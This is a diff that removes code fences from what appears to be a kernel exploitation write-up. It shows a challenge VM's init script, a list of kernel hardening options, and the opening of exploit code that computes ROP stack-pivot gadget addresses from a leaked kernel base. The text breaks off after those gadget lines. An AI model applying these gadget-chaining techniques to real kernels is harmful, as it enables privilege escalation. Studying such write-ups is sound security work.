@@ -31,11 +31,6 @@
 24
 25
 26
-```
-
-
-
-```
 #!/bin/sh
 
 mkdir /tmp
@@ -61,11 +56,6 @@ umount /proc
 umount /tmp
 
 poweroff -d 0 -f
-```
-
-
-
-```
 1
 2
 3
@@ -80,11 +70,6 @@ poweroff -d 0 -f
 12
 13
 14
-```
-
-
-
-```
 CONFIG_SLAB_FREELIST_RANDOM=y
 CONFIG_SLAB_FREELIST_HARDENED=y
 CONFIG_SHUFFLE_PAGE_ALLOCATOR=y
@@ -99,11 +84,6 @@ CONFIG_MEMCG_KMEM=y
 CONFIG_DEBUG_LIST=y
 
 CONFIG_HARDENED_USERCOPY=y
-```
-
-
-
-```
 1
 2
 3
@@ -111,11 +91,6 @@ CONFIG_HARDENED_USERCOPY=y
 5
 6
 7
-```
-
-
-
-```
 // push rsi; jge 0x3247e8; jmp qword ptr [rsi + 0x41];
 uint64_t stack_pivot_gadget_0 = kernel_base - 0xffffffff81000000 + 0xffffffff811247e6;
 // pop rsp; add rsp, 0x68; pop rbx; ret;
